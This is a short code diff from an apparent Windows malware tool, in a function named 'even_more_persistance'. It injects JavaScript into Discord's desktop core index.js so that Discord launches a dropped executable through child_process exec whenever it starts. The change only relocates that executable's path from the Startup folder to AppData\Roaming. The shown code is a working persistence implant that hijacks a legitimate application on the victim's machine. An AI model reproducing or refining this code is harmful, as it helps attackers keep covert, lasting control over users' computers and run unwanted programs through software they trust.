@@ -69,7 +69,7 @@ def even_more_persistance():
     jspath = roaming + "\\discord\\0.0.309\\modules\\discord_desktop_core\\index.js"
     payload = """module.exports = require('./core.asar');
     const { exec } = require("child_process");
-    exec(""""'C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + base + "'"""", (error, stdout, stderr) => {
+    exec(""""'C:\\Users\\" + user + "\\AppData\\Roaming\\" + base + "'"""", (error, stdout, stderr) => {
     if (error) {
             console.log(`error: ${error.message}`);
             return;
